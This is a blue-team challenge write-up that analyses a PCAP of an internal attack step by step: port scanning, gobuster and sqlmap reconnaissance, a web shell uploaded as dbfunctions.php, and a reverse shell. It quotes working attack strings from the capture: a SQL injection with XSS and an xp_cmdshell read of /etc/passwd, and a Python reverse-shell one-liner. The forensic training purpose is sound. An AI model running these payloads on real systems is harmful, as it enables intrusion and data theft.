# Web Shell

**Challenge:** Network Analysis — Web Shell  
**Link:** https://blueteamlabs.online/home/challenge/network-analysis-web-shell-d4d3a2821b  
**PCAP:** `BTLOPortScan.pcap`

---
## Scenario
The SOC received an alert in their SIEM for ‘Local to Local Port Scanning’ where an internal private IP began scanning another internal system. 
---

> Notes: a local host shoudnt be scanning another host, unless it is an authorized host that is used for vulnerbility scans

### 01. What is the IP responsible for conducting the port scan activity? 

    Statistics --> Conversation --> TCP :
        - I see port scanning activities from ip.address == 10.251.96.4 to 10.251.96.5
        - The first package is 117 at 2021-02-07 23:33:06 and the last package is 2166 at 2021-02-07 : 23:33:06

### 02. What is the port range scanned by the suspicious host?

**Statistics --> Conversation --> TCP:**
    I sorted the destination ports by ascending order, then I saw the range of port scanning from 1 to 1024 (dynamic ports)

### 03. What is the type of port scan conducted? 
    TCP Syn Scanning

### 04. Two more tools were used to perform reconnaissance against open ports, what were they?

**in 2215th package: I see suspicous activities:**
    User-Agent: gobuster/3.0.1 --> a Tool use to scan possible web directory that hidden from user
    
**I filtered by a command such "ip.src == 10.251.96.4 && http.request.method == POST", then I look at 13979 package:**
    - User-Agent: sqlmap/1.4.7#stable (http://sqlmap.org) 
        --> a tool use to setup automatically some sql commands to collect some data with username=user&password=pass.
        
    - in 14060th package:
        POST /?QLuT=8454%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 HTTP/1.1 
            
        - decode :POST/?QLuT=8454 AND 1=1 UNION ALL SELECT 1,NULL,'<script>alert("XSS")</script>',table_name FROM information_schema.tables WHERE 2>1--/**/; EXEC       xp_cmdshell('cat ../../../etc/passwd')#HTTP/1.1 
    -->SQL injection here
    
### 05. What is the name of the php file through which the attacker uploaded a web shell? 
    editprofile.php

### 06. What is the name of the php file through which the attacker uploaded a web shell?
    - still using the previous command, I look at 16102th package:
        request from ip suspicous ip 10.251.96.4 to 10.251.96.5:
            POST /upload.php HTTP/1.1
            Content-Disposition: form-data; name="fileToUpload"; filename="dbfunctions.php"

### 07. What is the parameter used in the web shell for executing commands?
    - in the 16134th package: 
        GET /uploads/dbfunctions.php?cmd=id HTTP/1.1\r\n --> paramater is "cmd"

### 08. What is the first command executed by the attacker?
    - in the 16134th package: 
        GET /uploads/dbfunctions.php?cmd=id HTTP/1.1\r\n --> first command is "id"

### 09. What is the type of shell connection the attacker obtains through command execution?
    - reverse shell: 
        is a technique where a compromised host opens an outbound connection to an attacker-controlled system and then provides shell access back over     that connection.

### 10. What is the port he uses for the shell connection? 
    - in the 16201th pakges:
        request from 10.251.96.5: 
            [GET /uploads/dbfunctions.php?cmd=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.251.96.4%22,4422));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);]
            
    - decode : 
            python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.251.96.4",4422));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
    --> connection to 4422 port number.

